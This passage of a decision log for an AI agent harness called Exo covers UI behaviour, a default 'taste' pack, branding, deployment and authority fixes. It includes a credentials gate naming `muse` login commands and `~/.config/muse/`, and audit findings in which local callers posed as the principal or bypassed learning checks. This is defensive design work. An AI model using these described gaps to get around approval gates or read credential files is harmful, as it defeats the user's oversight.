  github-markdown-css; `httpx2`, `starlette` and `rich` are declared in the extras that import them; the terminal
  client no longer depends on the PyPI project named `exo`; `uv.lock` is committed.
- **Decision (hygiene):** GitHub Actions runs the root suite and each plugin suite separately, on macOS and Ubuntu,
  Python 3.11 and 3.13, plus ruff with the F rules. Ruff runs with `--exit-zero` until the existing unused imports
  are cleaned up. Duplicate plugin test names were renamed so `pytest plugins` collects. The default handoff folder
  is `$EXO_HOME/handoffs` (or `handoff_dir` in the config), not one person's layout.
- **Decision (site):** planned clients are marked planned; the explain key and the session tree panel were removed
  from the copy because the clients do not have them; "the whole learning curve" now says "get you started"; the
  whitepaper and site no longer pin a test count.
- **Not done:** git history still holds the removed files and the earlier constants. It must be rewritten before the
  repo goes public. The F401 baseline is not fixed yet.

## D-043 (2026-10-12) Esc never stops a turn; the approval card keeps out of your typing
- **Why:** the principal ruled that Esc interrupting a turn is bad UI. It is too easy to hit by habit. Esc should be soft.
- **Esc:** closes the completion menu or dismisses ghost text, then clears a guidance line, then leaves a panel,
  otherwise nothing: no notice, no beep. On the approval card it does not deny. The web client never had an Esc stop.
- **Stop:** ctrl+c while a turn runs (the composer text stays, a dim "stopped" line shows), `/stop`, and the web
  Stop button. Idle ctrl+c is unchanged: Textual's hint that ctrl+q quits; a single press never quits. Typing while a
  turn runs still steers.
- **Approval card (client side only):** it does not take focus from a composer that has text or was typed in during
  the last 1.5 s, and it claims focus later once the composer is empty and quiet. Single keys act only when the card
  has focus. Allow always needs `a` then Enter, or `A`. This matches the web guard. The gate and approval identity
  in the core are untouched.
  *Amendment 2026-10-13 (issues #33, #34):* the late focus claim let ordinary typing answer a card: after a send
  empties the composer, "ok" allowed once and "Act" granted `allow_always`. The card now never takes focus by
  itself; `ctrl+f`, Tab or a click moves to it, and Esc on the card returns to the composer. `A` waits for Enter
  like `a`. The web card uses the same `o` / `a` / `d` keys, with a separate confirm for always. Esc still never
  stops a turn or answers a card; `ctrl+g` stays the composer pane (D-046); D-045 reconciliation is unchanged.
- **Failover:** `SharedClient._failover` runs the socket probe, the engine start and the wait for another window in
  a thread, so the terminal keeps drawing.
- **Docs:** user guide, UI, COMMANDS, WEB, JOBS, TRACE, ONBOARDING, the site, the whitepaper and the intro skill.

## D-044 (2026-10-12) Taste baseline: ship a house taste, then fit the new user
- **Status:** Accepted 2026-10-12. Design in docs/TASTE-BASELINE.md. **Wave 1 built** 2026-10-12 (layers and
  export, `src/exo/baseline/`): the pack loader (a pack is used only once released, with every value and contested
  item ticked by the principal), per-item lookup with source tags, house precedence, `exo taste`,
  `exo taste export-house` with the privacy and value checks, `exo taste review`, and the taste block in the
  prompt. The shipped pack is an empty 0.0.0 placeholder until the principal releases the first one. Waves 2 and 3
  are not built.
- **Contested questions (principal, verbatim, 2026-10-12):** "C ship the implications behind the world view and the
  kind of thinking behind it rather than specifics like religious prescriptions and border-based politics". Value
  items on contested questions ship as reasoning style and its implications only; no faith, nation, party or
  territory, no prescribed practice.
- **Ruling (principal, verbatim, 2026-10-12):** "the project should ship with my taste as a baseline because its a
  good starting point and its been finely tuned with a lot of hard work. then over time it should mould and readapt
  to the new user that it works with. perhaps an innate decay mechanism for older memories/learnings, perhaps
  stronger if large delta from new behaviours (but after a repeated reinforcement of new behaviours, not
  immediately), perhaps the decision model could play a role in this"
- **Rulings on the open questions (verbatim, 2026-10-12):** (1) "agreed with C, but users should have the ability
  to toggle the choice presented in A in case they prefer silent adaption vs active control". (2) "should be even
  slower actually. think about how change happens in a person, vs moods, swings, circumstances, etc. changes
  matter but only if sustained over time. repitition also only matters if sustained." (3) "everything in A, safety
  defaults should not be related to taste, C yes the values and worldview should carry but shift/adapt faster to
  a new user on fresh install and/or detection of a strong/significant change because value/worldview alignment
  is the most offputting factor a companion can have"
- **Decision:** a scrubbed, versioned, read-only **house taste** pack is exported from the principal's store by
  `exo taste export-house`, reproducible and failing on any personal or internal name. It holds method items
  (writing and answer style, work method and verification), identity-free value and worldview items, a house soul
  with no values or safety rules, and the list of shipped skills. People, clients, history, quotes and evidence
  never ship (D-004). Lookups resolve per item: ruling, pin, learned (or scoped) item, then house item, each shown
  with its source. House items lose precedence slowly (`max(0.3, 0.7 * 2^(-t/365))`) and never vanish.
- **Method items change only on sustained change (ruling 2):** signals collapse into one episode per session or
  day; a week counts when its episodes mostly go one way; a persistence score adds contradicting weeks and
  subtracts agreeing ones. An item arms at 3 net weeks within 8, fades by `2^(-n * d / 4)` per further net week,
  and swaps once below 0.3 with the user's version ahead by 0.15. A full swap takes 8 to 12 weeks of sustained
  change. Moods and swings disarm with no residue; place- or task-bound patterns become scoped items; period-bound
  ones (a deadline week) make nothing. 90 days quiet after a swap, undo or no.
- **Adaptation mode (ruling 1):** `/taste mode ask|silent`, for inferred changes only. Ask: one proposal, no
  answer means no change, never re-asked. Silent: the change happens, shows in `/taste` and the brief, and can be
  undone. The principal defaults to ask and the shift rule runs on his own inferred items; new users default to
  silent, because swaps are rare, earned and visible and early questions cost more than they save.
- **Values (ruling 3):** retreat fast, adopt slow. On a fresh install (30 days and 20 sessions, at most 90) house
  values start at 0.5 and step back on one clear signal; later, one strong signal or a stated opposing view
  steps a value back at once. Stepped back means neutral, and never needs a yes. The user's own view is adopted
  only after they state it and hold it for 4 net weeks within 12; adoption follows the mode. Value items pass a
  tighter export check: no named people, groups, places, politics, religion or personal history; each value is
  generalised to a principle and read by the principal before release.
- **Safety defaults are not taste (ruling 3):** gate, approval, budget, posting and other policy defaults ship as
  product policy in `templates/principal-store/policies/` (docs/GATE.md), change only by code change or the
  user's explicit edit, and are never exported, weighted or decayed. Guarded items do not ship.
- **Guards:** only `author == principal` signals count (D-040); pasted text, quoted views and role play are not the
  user's view. The decision model only classifies (relation, delta, scope, voice), abstains below 0.6, is capped,
  and never swaps, adopts or steps back.
- **Why:** D-004 asks for both fit and replicability. A new user gets a tuned start instead of an empty one, and
  the same learning loop that fits the principal then fits them, at the pace people actually change.
- **Rejected:** shipping the principal's store as is (personal data, D-004); starting every user empty (wastes the
  tuning); counting raw signals or swapping within weeks (moods would move taste); silent swaps for the principal
  and turning the rule off for him (ruling 1); letting the decision model act (a classifier error would become a
  lesson); shipping gate defaults as taste (ruling 3); adopting a value from behaviour alone (a guess; neutral is
  the safe fallback).
- **Contested questions:** answered by ruling 4 (above): reasoning style only.

## D-045 (2026-10-12) Approval cards never outlive their request; the web stream resumes; a queued steer can be pulled back
- **Amendment 2026-10-27 (thread drafts):** the web composer keeps unsent text and selection with its
  conversation, including the initial new-conversation slot. Drafts survive navigation between web views in
  page memory only; reload and closing the page discard them. Sending has a per-conversation pending guard.
  Unconfirmed sends retain recoverable text at their originating conversation, including a newly created one,
  without replacing newer edits or sending again automatically. Recovery asks the user to inspect the thread
  before sending again because a lost acknowledgement does not prove rejection. Delayed opens and unsteer
  replies cannot redirect newer navigation or put one conversation's text into another composer.

- **Amendment 2026-10-27:** chat notices belong to their selected session. Additive optional notice source
  and model-call identity fields let a successful matching call clear its route warning without clearing
  newer general notices or command errors. Turn completion clears only outstanding route warnings.
- **Amendment 2026-10-27 (#722):** an accepted internal `Loop.steer` message receives an ID before it
  enters the queue. A supplied ID is preserved through snapshots, cancellation and delivery. A refused steer
  receives no new ID and changes no queued message. No command or protocol field changes.

- **Amendment 2026-10-27:** web approval cards state their available answer sequence and the deliberate Ctrl+F focus
  step. Instructions change for always confirmation and deny-note entry. A focused card has an accent outline.
  Existing focus, confirmation and approval authority rules remain unchanged.
- **Amendment 2026-10-20 (#361):** terminal steer lines explicitly show sending, queued and delivered. A send reply
  alone never proves delivery: the matching user `message.completed` does, including when it arrives before the
  reply; the existing successful `unsteer` acknowledgement can also confirm it already left the queue. Such early
  event receipts are held only while sends are in flight. A lost reply shows delivery unknown; a refused
  send shows not sent. The activity line leads with the queued count while a draft is typed. Approval cards lead
  with `Ctrl+F, then [o] once [a, Enter] always [d, Enter] deny`, before request details. Ctrl+F still deliberately
  focuses the card, preserves the draft and keeps the existing answer confirmation. No binding or authority changes.
  Send and unsteer replies received after a thread switch never update the new thread's draft or queued count.
- **Amendment 2026-10-19 (#276):** the terminal serializes approval-card removal with thread switching and restoration,
  and waits for removal before mounting the next card under the same widget id. A close or answer names its request,
  so a stale event cannot remove its replacement. Threadless requests still survive thread switches. The response
  worker starts after the answered card's removal. No command, key, setting or approval authority changes.
- **Why:** the principal reported an approval card stuck on screen in the terminal and on the web with nothing pending in
  the core, a card the terminal could not answer, a web chat that stopped responding, and wanted to cancel a queued steer.
- **Stuck card, core:** `CoreEngine.ask` published `approval.resolved` only from the respond path. A turn stopped or
  cancelled while the card was open (ctrl+c, `/stop`, a peer hold that expired) closed nothing in the clients. Now one
  `announce_resolved` runs on every exit, once per request: answered, expired, or `cancelled` by `core`.
- **Stuck card, web:** the web server keeps a mirror of open approvals built from replayed events, and the page merged
  that list into what it held and never removed anything. A request replayed from the log after a core restart (no
  resolved event was ever written) came back on every refresh. Now `CommandCentre.reconcile_approvals` compares the
  mirror with `approvals.list` at bootstrap and before `/api/section/approvals` answers (only requests older than the
  call are dropped), and the page replaces its cards with that list on each thread open and stream reconnect. A 404
  on answering also removes the card. A resolved id is remembered so a late replay cannot bring it back.
- **Stuck card, terminal:** the window had no check against the core. It now asks `approvals.list` every 3 s while a
  card is open and drops any it no longer holds. The card was reachable by Tab, but only that way: `ctrl+f` (first `ctrl+g`, moved when D-046 took it for the composer) now moves
  focus to it from anywhere and the card says "tab, click or ctrl+f". The shared-socket path as the principal (second
  window, `X-Exo-Principal`) is covered by a test and works.
- **Web chat stopped:** `/api/events` took `?since=` before `Last-Event-ID`. A browser that reconnects by itself repeats
  its first URL, so every dropped connection replayed the whole history from page load and `message.delta` text doubled.
  The server now resumes from the later of the two and the page ignores a seq it has handled. A browser EventSource also
  never retries after an HTTP error (403 after the web server restarts with a new token, 502 while the core restarts), so
  the page listened to nothing. `bus.js` now reopens the stream itself with backoff from the last seq, and shows "page
  link expired" on a 403. Terminal: `Client.events(reconnect=True)` let a `ClientError` (non-200) end the feed for good;
  it and `SharedClient.events` now back off and retry.
- **Cancel a queued steer:** the command cap is full, so it is a `command.run` built-in, `unsteer` (args: message id,
  empty means the newest), and one new event, `steer.cancelled` (29 events, still under the cap of 30). `turn.send`
  in steer mode now returns `message_id`. The terminal shows `steer queued ›`; Up in an empty composer or `/unsteer`
  pulls it back into the composer. The web shows a chip above the box with an `×` and Up does the same. A steer that
  landed first answers "nothing queued" and is not removed twice. Esc is not used (D-043).
- **Not changed:** the gate, approval identity (D-033, D-039) and the page token.
- **Docs:** user guide, UI, COMMANDS, WEB, DEVELOPER-GUIDE, CORE counts, the intro skill.

## D-046 (2026-10-12) Focus follows the user, a big composer pane, and an inverse layout (experiment)
- **Web status amendment (2026-10-28, #777):** instruments wrap within the conversation width in both layouts.
  Model names and values wrap instead of shrinking to padding or being clipped. Notices use their own wrapped row;
  the busy wire remains visible. When the status grows taller than the available space, the chat column scrolls
  and the log retains space to scroll independently. Narrow screens retain their responsive log height, and the
  slash-command menu remains readable. This changes no command, telemetry, activity state or permission.
- **Why (A, verbatim):** "for the cli the user shouldnt have to click exactly inside the tiny text bar for them to start
  prompting." And: "something like a composer built into the cli so write longer more structured prompts." And on a chat
  that opened at its top: "instead of fixing it and flipping it, lets be creative. lets experiment with an inverse ui where
  the text bar is at the top and text/reasoning lines appear from the top instead of the bottom, pushing text down."
- **Focus (terminal):** a click on the transcript or any plain surface returns focus to the composer, and a printable key
  that reaches the app with focus on the transcript (or nowhere) is typed into the composer. A focused panel, the
  completion menu, an input field and the approval card keep their own keys.
- **Composer pane (terminal only):** the same composer widget grows to most of the screen, so the D-037 menu, `@` files and
  ghost text work unchanged and the draft is just the composer text: closing the pane cannot lose it. Open with `ctrl+g`
  (ctrl+e was taken by "edit the last answer", and is cursor-to-end in a text area) or `/compose`. Enter adds a line,
  `ctrl+s` or `ctrl+enter` sends (ctrl+enter only arrives on terminals that report it, so ctrl+s is the dependable key),
  Esc closes (the menu and ghost text first; it never stops a turn, D-043). Header with words, lines and keys, soft wrap,
  light markdown colour, `ctrl+l` line numbers, `ctrl+t` or `/compose edit` for `$VISUAL`/`$EDITOR`, `/compose task` for a
  Goal / Context / Constraints / Done when scaffold. Up and down only move the caret there (history would eat the draft).
  Rejected: a separate modal editor (would need a second completion path); ctrl+x ctrl+e (ctrl+x is cut).
- **Inverse layout (experiment, both clients):** the box is at the top, messages stack newest first, a thread opens on
  its newest item, which is at the top. Inside one message the text reads top to bottom. A tool line or system line is its
  own item, so it goes above the message before it: newest first at item level, with the live streaming message directly
  under the box while it grows. The recommendation to keep tool lines under the live message was not taken: it needs a
  second rule for where "the current turn" ends, and item-level newest-first is one rule that can be explained in a line.
  Terminal: `/layout inverse|classic`, saved in `$EXO_HOME/state/ui.json`, `EXO_LAYOUT` overrides for one run. Web: a
  "Layout" button and `/layout`, saved in this browser (`localStorage`, key `xc-layout`; the one place the page uses it,
  and a test pins that). The approval card, activity line and menu sit under the box. The status strip goes with the box:
  directly above it in inverse, under the thread in classic (issue #102, both clients).
- **Default and how to flip it back:** inverse is the default for the experiment only. Terminal: `DEFAULT_LAYOUT` in
  `clients/tui/exo_tui/prefs.py`. Web: `DEFAULT_LAYOUT` in `static/layout.js`. Change it to `"classic"`; anyone who chose a
  layout keeps their choice. The older TUI tests pin classic through `tests/clients/tui/conftest.py`.
- **Bug found and fixed (web classic):** `.xc-chat` was `flex: 1` in a column with no fixed height, so its own `height` was
  ignored and a long thread grew the whole page: the log never scrolled and the box was off screen. It now has a definite
  height, the log scrolls inside it and opens at its newest item. The terminal already opened at the bottom (a test says so).
- **Not done:** a composer pane on the web page (the ask named the terminal); keeping tool lines under the live message.
- **Docs:** `docs/UI.md`, `docs/ui/WEB.md`, `docs/COMMANDS.md`, `docs/USER-GUIDE.md`, the intro skill, `docs/media/README.md`.

## D-047 (2026-10-12) Staging first for the public site
- **Decision:** `scripts/deploy-site.sh` deploys to `staging.exo.askaconsult.com` by default. Production needs an explicit
  `--prod`, prints the target and, when run interactively, asks for the word `production` typed back. Staging is its own
  Vercel project (`exo-site-staging`) with its own domain and a DNS CNAME to `cname.vercel-dns.com`, and it is never indexed
  (`robots.txt` disallowing all, plus an `X-Robots-Tag: noindex, nofollow` header). Both targets deploy from a git-free copy.
- **Why:** the site is public and the old script went straight to production, so a bad page was live the moment it was
  deployed. A separate project means a staging deploy cannot touch production at all.
- **Rejected:** a preview deployment of the production project (shares settings and domain, easy to promote by mistake);
  a branch-based flow (the site is deployed from a git-free copy on purpose).
- **Revisit if:** the site gains a build step or more than one maintainer deploys, when CI should own promotion.
  *Amendment 2026-10-20 (PRs #352, #358, #359):* the script fails closed where git's view of `site/` and the copy could
  differ. Any deploy refuses when `site/` holds untracked files (ignored ones too), contains a submodule, is itself a
  symlink (untracked, or tracked with mode 120000) or is not a directory, and when git cannot list the files or read the status of `site/`; a
  versioned deploy also needs a clean `site/`. An empty `EXO_VERCEL_CLI` exits 2 rather than falling back to the pin.
  There is no override. Symlinks inside `site/` stay allowed: `rsync -a` copies them as links, not their targets.
- **Docs:** `docs/DEVELOPER-GUIDE.md` "Deploying the site".

## D-048 (2026-10-12) Exopet: Exo as a living lattice
- **Status:** Proposed 2026-10-12, revised 2026-10-13 (the community egg moved to D-058) and 2026-10-18 after review.
  Design in docs/EXOPET.md, options and recommendation first. Nothing built. Independent of D-057.
- **Why (principal, 2026-10-12):** bring the earlier pet experiments (EvoPet, TamaHermes) into Exo in its own look and
  make them more: the first evolution unlocks only when the community together has earned enough XP, then Exo
  hatches from its digital egg; later users get personal evolution; a pet gallery; a skill to make a pet from the
  user's direction with animations mapped to activity; the egg and forms grow out of the incentre lattice, "an alive
  evolving pulsing matrix of information".
- **Proposal:** the pet is Exo, drawn as the incentre lattice. Ten forms on EvoPet's 99-level ladder: egg, cell, tile,
  cube, frame, then one per dimension from 4 to 8, drawn with the brand egg's stages where a client uses the egg
  (docs/EXOPET.md section 1 has the mapping to D-049). XP is a versioned pure function of the verified ledger
  (principal-authored, pinned keys, anchored), weighted toward teaching (verdicts, rulings, promoted lessons) over
  volume, with a daily curve capped at 1,000 and one form per day. No care stats, needs, decay or notifications. The
  first evolution waits for the community egg, x0 (D-058). Learned items light cold-blue dots, house taste shows grey
  (D-044). No new protocol event: the state comes from existing events, status from a `pet` built-in. A data-only
  `exopet.json` format, a gallery run as an index repository with CI and signed packages, and an `exopet-create`
  skill.
- **Depends on:** D-056 (Accepted) takes its codenames from this form line (egg, cell, tile, cube, frame). A ruling
  against the form names leaves those codenames without a source.
- **Rejected:** XP per token (rewards long, wasteful turns); a stored XP number (editable); care stats and hibernation
  (guilt and nags in a work tool); a face (off the instrument look); a new protocol event (29 of 30 used); pets as code
  (a gallery would run strangers' code); a server that sees ledgers (breaks local-first); install reports, a counter
  service and receipts for the community hatch (removed by D-058).
- **Open:** seven questions for the principal at the end of docs/EXOPET.md (hatch target, a slow community, x0 after the
  hatch, the core cap, agent work, default on or off, the founders' ring), each with a recommended pick.

## D-049 (2026-10-12) Brand: the lattice egg and the X/V mark
- **Status:** Accepted 2026-10-13 (the principal: "a work of beauty"). Proposed 2026-10-12, previewed on staging
  only. On acceptance the lattice egg became the front-page default on every host (`?egg=off` keeps the old orb as an
  escape hatch). The favicon, nav mark and og image still wait for their own change.
- **Why (A, verbatim):** "what if in the logo and branding we made the top half of the x in exo orange so it also looks
  like a v and center our branding around a continually evolving harness, ecosystem, etc." And: "i want the logo for exo
  and all this to be based on my favourite geometric figure since childhood ... an alive evolving pulsing matrix of
  information." The site orb was named "the perfect analogy for a digital egg".
- **Decision:** one figure for everything: a square, its X, and the incentre of each triangle (credit: the
  aska-digital/incentre-lattice research). The wordmark is "exo" with the x drawn as the square's diagonals at 45°; the
  x's top half, which owns the crossing, is `#ff5b14` and reads as a V (exo, and also evo). The e and o are cut from
  regular octagons, the octagon the tiled dots make. Pick: variant A, "facet"; C "seed" is the display form and D "caps"
  the label form; B "round" is rejected (a second shape language, blurs first at 16 px). The mark is the drawing with the
  V and the top dot (the seed) in orange; at 16 px only the X with its V remains.
- **The egg:** `site/brand/egg.js` replaces the front-page orb's shell of nodes with the honeycomb the drawing makes in
  3D and 4D. Cells pulse, packets of information travel the edges, and a heartbeat in the core sets the pace. One stage
  parameter (0 egg, 1 hatchling, 2 lattice, 3 hyper, 4 spare) adds cells, structure, a dimension and brightness;
  fractional stages blend. This is the hook the exopet evolution line can drive. API in `docs/BRAND.md`.
- **Rejected:** a WebGL renderer (the lattice is at most about 2,000 lines; Canvas 2D costs under 1 ms a frame); a
  Fibonacci-sphere shell (it is not the figure); replacing the favicon and nav mark now (they wait for acceptance).
- **Open:** whether the terminal header takes the braille mark (`site/brand/tui-mark.txt`, a proposal only); the
  migration of the nav mark, favicons and og image; the exopet mapping from its evolution line to stages.
- **Docs:** `docs/BRAND.md`; assets generated by `scripts/brand_assets.py`.

## D-050 (2026-10-12) Consumer path: local first, desktop apps after the build settles
- **Why:** the 2026-10-12 audit (item 10) asked for the consumer path to be decided before building toward it.
  The principal ruled on four options for how Exo reaches a new user and where their keys live.
- **Local first (standard):** Exo runs on the user's machine; the web client is served by that machine on a
  loopback address; keys go from the page or terminal straight into the OS keychain and never cross the network
  except to their provider (D-034, D-039). Signed downloadable desktop apps come after the build settles, so the
  package is not rebuilt for every change.
- **Remote access (architecture option):** a hosted page that pairs with the user's own core over an end-to-end
  encrypted relay, so keys and memory stay at home. Kept as a valid design, not scheduled.
- **Hosted cores (roadmap only):** running user cores on our servers would make us the custodian of keys and
  memory. Considered only through cryptographic or decentralized compute that keeps the operator blind.
- **Own inference (later):** a keyless path where users never handle API keys, once funded.
- **Rejected for now:** a hosted service that stores user keys on our servers.
- **Implementation acceptance:** `docs/CONSUMER-PATH.md` proposes the first user, local web surface, first five
  minutes and calm defaults for review under #50. It separates implemented fixes from usability and distribution
  checks still required; it does not replace these principal rulings or claim consumer acceptance.

## D-051 (2026-10-12) muse-cli: a Muse Code subscription through the `muse` CLI
- **Decision:** add a keyless provider `muse-cli` that runs `muse exec` as a subprocess, modelled on `claude-cli`.
  Exo never reads, copies or stores the Muse token; the CLI owns it in the OS keychain. Status reads only the
  non-secret `mechanism` and `subs_active` fields of `~/.config/muse/auth.json`. The test call is one tiny
  `muse exec` prompt, mapped to the existing error classes plus a new one, `unsigned`.
- **Why:** the subscription is reachable only through the vendor's login. A subprocess keeps the token out of Exo
  and out of every log, which is the same line D-034 and D-039 draw for keys.
- **Limits, accepted:** text only (a turn with tools is refused with status 501 so the router falls back), one
  process per turn, no token stream, no usage counts, history flattened into one prompt. On macOS native binaries
  need signing for keychain access (`OSStatus -67068`). Exo checks native Mach-O commands with `codesign -dv`;
  a shell launcher's signing state is unknown, and Exo lets it run without claiming its binary is verified.
  An actual signing failure remains `unsigned`, and signing or startup errors allow router fallback.
- **Locked down:** the run has no shell, no writes, no web tools, no reminder agents, no imported foreign
  personal context and no session log, in a private temporary workspace. Timeout and stop clean the entire
  process group, including descendants after leader exit, with bounded waits before returning an error.
  `META_API_KEY` is dropped from the child so the subscription, not an API account, is used.
- **Gate:** `muse login`, `muse auth` and `muse logout` (any position, executable paths and nested shells too)
  and `~/.config/muse/` are `credentials`: always ask, regardless of lowering policies or standing grants.
- **Rejected:** reading the token from the keychain or `auth.json` and calling the API directly (Exo would hold a
  vendor secret); passing `META_API_KEY` through (bills an API account, not the subscription).
- **Revisit if:** `muse exec` gains a structured output or tool bridge, which could lift the text-only limit.
- **Docs:** `docs/PROVIDERS.md` "Use a Muse Code subscription", `docs/GATE.md` "Muse CLI credentials",
  `docs/DEVELOPER-GUIDE.md` "Add a CLI-backed provider", `docs/WHITEPAPER.md` §13.1, `docs/TOOLS.md`.

## D-052 (2026-10-12) Principal authority applies to messages, learning and settings
- **Why:** an audit reproduced local callers submitting turns, steering, verdicts and panel actions that became
  principal-authored learning evidence. The same callers could accept relaxed gate policies and change settings
  or model routes. Approval answers already checked transport identity, but these adjacent operations did not.
- **Decision:** snapshot the live transport caller when a turn or steer is accepted. Only a principal connection
  produces principal-authored text. Local automation may still drive turns, with author `local`. Background turns
  without an explicit author are system input. Feedback, panel responses, settings, model selection and gate
  policy acceptance require a live principal caller. The policy adoption method checks authority itself, covering
  command aliases and direct plugin callbacks. Its ledger record names the authenticated caller.
- **Transport and clients:** stdio always stamps local, even if its dispatcher has an interactive default. The web
  provider route returns 403 on a core authority refusal and cannot use its offline disk fallback to evade it.
  Preference-pair context includes only principal-authored messages. No protocol command or event was added.
- **Peers and steers:** `peers send` with `via="human"` is a body claim. From a non-principal caller it is sent as
  `via="agent"`, so the receiver never frames it as the principal typing in another client. `unsteer` from a
  non-principal caller pulls back only non-principal steers; the principal's queued words stay.
- **Validation:** regression cases cover untrusted send and steer, feedback and panel actions, policy relaxation,
  settings, aliases, direct calls, caller expiry, TCP, stdio, Unix sockets and a tool child holding the test
  credential. Authenticated user operations remain covered by positive controls.
- **Limits:** same-user processes still need an OS sandbox. Earlier misattributed messages are not rewritten.
- **Docs:** `docs/GATE.md`, `docs/MEMORY-MODEL.md`, `docs/COMMANDS.md`.

### Amendment (2026-10-25): only the principal changes scheduled jobs (#552)
- **Decision:** `handle_schedule_edit`, reached through `Scheduler.edit`, requires the live transport principal
  for every action except `list`, implementing D-057 section 0.1 independently of triggers. Local, channel, seat, unstamped and
  expired callers are refused before job mutation or launch. The authenticated clients keep working.
- **Why:** a local caller could create unattended work or alter the principal's existing jobs. Listing
  jobs is read-only and remains available. The timer and the internal `add`, `pause`, `remove` and `launch`
  methods keep their role.
  The check lives outside the counted core, also guarding direct command-handler calls, rather than adding
  product logic to `CoreEngine._schedule_edit`. The core keeps forwarding the live caller context.
- **Rejected:** only blocking a scheduling tool, since the protocol command reaches the scheduler directly.
- **Revisit if:** an explicit scoped delegation mechanism is introduced for schedule management.
- **Docs and tests:** `docs/SCHEDULE.md`, `docs/GATE.md`, `docs/EVENT-ACTIVATION.md`, both guides, and
  `tests/core/scheduler/test_scheduler.py` cover refusals, no side effects, caller expiry and every principal action.

## D-053 (2026-10-12) Verification isolates terminal preferences and documents current behavior
- **Why:** the baseline root suite failed four TUI checks solely because the invoking terminal exported
  `NO_COLOR`. Removing that variable made all four pass. Changing `TERM` did not. Product behavior was correct,
  but the tests inherited an unrelated user's display preference.
- **Decision:** the repository test fixture clears inherited `NO_COLOR`. Tests of no-colour mode set it explicitly.
  The product continues to honor the user's setting. Existing tests cover both modes.
- **Documentation corrections:** the approval focus shortcut is ctrl+f. Ctrl+g opens the composer. Undo hides log
  entries and invalidates covering summaries, matching D-041 and the implementation.
- **Docs:** `docs/DEVELOPER-GUIDE.md`, `docs/UI.md`, `docs/MEMORY-MODEL.md`.

## D-054 (2026-10-12) Ruling citations do not waive mandatory learning checks
- **Why:** the direct-ruling shortcut ran before the guarded-domain and evaluation rules. A reviewer could cite
  a real but unrelated principal statement and install a derived skill or guarded lesson without those checks.
- **Decision:** held conflicts, guarded proposals and mandatory evaluation checks run before the shortcut.
  Skills always need evaluation, even if the configured type list omits them. Configured high-impact or gated
  lessons retain their critic, evidence-weight and session-count requirements. Missing held-out cases cannot pass.
  Rule numbers stay stable in the ledger. Ordinary unguarded taste and fact lessons retain the direct-ruling path.
- **Principal control:** original rulings remain available in the ledger and context. Explicit acceptance of a
  concrete proposal remains a separate path. A reviewer merely citing a ruling does not exercise that authority.
- **Validation:** regressions prove unrelated ruling citations cannot bypass skill evaluation or guarded review,
  and cover configured gates, evaluation success and failure, critic objections, held conflicts and direct acceptance.
- **Limit:** citation authorship alone does not establish semantic support for an ordinary unguarded lesson.
  Binding derived claims to the cited words still needs a separate design and evaluation.
- **Docs:** `docs/LEARNING.md`, `research/LEARNING-LOOP.md`.

## D-055 (2026-10-12) Keep staging current; package with Electron after the core and browser
- **Why (A):** update the latest staging site as the work advances, improve it where useful, and eventually package
  the browser client as an Electron desktop app. Packaging is the last step after polishing the core engine and codebase.
- **Delivery order:** core verification and review, then browser workflow polish, then Electron packaging. The desktop
  package is a chosen direction, not a built client. Its eventual checks include installation, core lifecycle, signing
  and updates on the intended platforms. The roadmap gives the exit criteria for each stage.
- **Evidence:** the site identifies the authority and learning fixes at `1532fa9` as in review in draft PR #57, with
  links to the revision and CI results. A successful local installation does not make an unmerged change built on main.
  The four existing roadmap states stay unchanged. House taste wave 1 is layers and export tooling; the shipped
  `0.0.0` pack is empty. A curated pack and adaptation remain future work.
- **Research:** AIOS and AI Legion are public references, not new dependencies. Frozen delegated permissions,
  isolated tools with a credential broker, durable steerable work and shared budget admission are exploring directions.
  Application authority checks are not described as OS isolation.
- **Site:** preserve the latest staging design, keep mobile page navigation reachable, provide section jump links,
  and show status in words as well as color. The lattice egg was a staging-only preview under D-049 until it was accepted on 2026-10-13.
- **Deployment scope:** this instruction authorizes staging updates. Deploy to `exo-site-staging` from a git-free copy,
  preserving staging's robots exclusion and noindex header. Production promotion remains separate under D-047.
- **Docs:** `docs/SITE-STATUS.md`; `docs/DEVELOPER-GUIDE.md` "Deploying the site"; `site/roadmap/` and the landing and
  web-client pages. No user commands changed, so the user guide is unaffected. Whitepaper updates remain batched.

## D-056 (2026-10-13) Versioning and naming
- **Why:** versions, branches and documents had no common naming, so an iteration could not be found again. The
  site had two ad hoc tags and Exo itself had no release tag.
- **Decision:** Exo is SemVer below 1.0, tagged `exo-vX.Y.Z`, with a codename per MAJOR from the exopet line (0.x egg,
  1.x cell, 2.x tile, 3.x cube, 4.x frame, then 4D and up) shown as `exo 0.2.0 (egg)`. Main becomes 0.2.0. The site
  is `site-vMAJOR.MINOR`, archived before each production deploy, and the deploy script tags and writes
  `version.json`. The whitepaper is `whitepaper-vX.Y`, the house taste pack `house-vX.Y.Z`. Decision numbers are never
  reused. Branch prefixes are listed. `CHANGELOG.md` follows Keep a Changelog.
- **Numbering:** D-055 is used by branch `feat/roadmap-page`, so this is D-056.
- **Validation:** tests check the `--version` form and that the changelog's latest release equals the pyproject version.
- **Docs:** `docs/VERSIONING.md`, `CHANGELOG.md`, `docs/DEVELOPER-GUIDE.md`.

## D-057 (2026-10-13) Event-driven activation: triggers, masked connectors, a runs dashboard, root causes
- **Status:** Proposed 2026-10-13, revised 2026-10-18 after the reviews. Design in docs/EVENT-ACTIVATION.md, options and
  recommendation first. Triggers remain unbuilt. Independent stage-0 work is noted below. Independent of D-048,
  D-058 and D-059.
- **Amends:** D-052. Job edits (`schedule.edit`, every action but `list`) join the operations that need a live principal
  caller. D-052 left jobs off that list and let local automation drive turns, so a local script can edit jobs today.
- **Why (principal, 2026-10-13):** Railtown AI's platform (railtown.ai: build, feed, observe the agent) gave the idea
  of agents started by events, not only by a person or a timer. Credited as the inspiration; none of its names are used.
- **Proposal:** a trigger is a scheduled job with `on` (an event source) instead of `when`, managed by `schedule.edit`:
  five new fields (`on`, `connector`, `limits`, `tools`, `roots`), no new protocol command or event. Stage 0 first,
  five fixes that repair gaps on main and stand alone: only the principal changes jobs (`schedule.edit` has no
  principal check today), a run can call only the tools it was given (a scheduled run is shown a shorter list but runs
  any registered tool by name), notes and learning read who wrote a line (scheduled-run text reaches other threads as
  `user:`), file search skips secret stores (`grep` and `glob` over the home folder return credential files with no
  question today), and one search cannot freeze the core (a backtracking pattern stops the event loop, and nothing
  limits a run's time). Then trigger runs that can only read: `read_file`, `glob` and `grep`, limited to the folders
  the trigger names, in a thread of their own (kind `triggered`, not in the agent log, no memory provider), author
  `trigger:<id>`, the envelope inside a D-040 tag, started through D-026's ingress path and under the gate, with the
  answer going to the principal's notices only (channel delivery comes with a reply tool in a later stage). Webhook
  first (signed, timestamped, replay-checked by signature, delivery id and body hash, secret under the credentials
